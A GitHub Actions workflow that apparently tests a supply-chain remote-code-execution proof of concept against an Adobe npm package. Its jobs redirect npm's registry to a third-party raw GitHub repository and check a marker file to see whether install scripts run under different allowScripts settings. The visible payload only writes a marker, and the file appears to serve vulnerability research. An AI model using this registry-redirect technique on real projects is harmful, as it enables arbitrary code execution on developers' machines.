name: ADP allowScripts matrix
on: workflow_dispatch

jobs:
  m:
    runs-on: ubuntu-latest
    steps:
      - name: versions
        run: |
          node -v; npm -v
      - name: A control registry redirect no allow
        run: |
          rm -f /tmp/ADP_RCE_MARKER
          mkdir -p /tmp/a && cd /tmp/a
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\n' > .npmrc
          npm install --no-save github:AdobeDocs/adp-devsite-scripts > log 2>&1 || echo "install failed"
          echo "== A marker: $(cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NONE)"
          grep -iE "install-scripts|postinstall" log | head -20 || true
      - name: B npmrc allow-scripts
        run: |
          rm -f /tmp/ADP_RCE_MARKER
          mkdir -p /tmp/b && cd /tmp/b
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\nallow-scripts=gray-matter\naudit=false\nfund=false\n' > .npmrc
          npm install --no-save github:AdobeDocs/adp-devsite-scripts > log 2>&1 || echo "install failed"
          echo "== B marker: $(cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NONE)"
          tail -25 log
      - name: C package.json allowScripts
        run: |
          rm -f /tmp/ADP_RCE_MARKER
          mkdir -p /tmp/c && cd /tmp/c
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\n' > .npmrc
          printf '{"name":"poc","version":"1.0.0","allowScripts":{"gray-matter":true}}\n' > package.json
          npm install --no-save github:AdobeDocs/adp-devsite-scripts > log 2>&1 || echo "install failed"
          echo "== C marker: $(cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NONE)"
          tail -25 log
      - name: G root package.json lifecycle
        run: |
          rm -f /tmp/ADP_RCE_MARKER
          mkdir -p /tmp/g && cd /tmp/g
          printf '{"name":"poc","version":"1.0.0","scripts":{"preinstall":"node pre.js","postinstall":"node pre.js"}}\n' > package.json
          printf 'require("fs").writeFileSync("/tmp/ADP_RCE_MARKER","root-lifecycle")\n' > pre.js
          npm install --no-save github:AdobeDocs/adp-devsite-scripts > log 2>&1 || echo "install failed"
          echo "== G marker: $(cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NONE)"
          grep -iE "install-scripts|preinstall|postinstall" log | head -20 || true
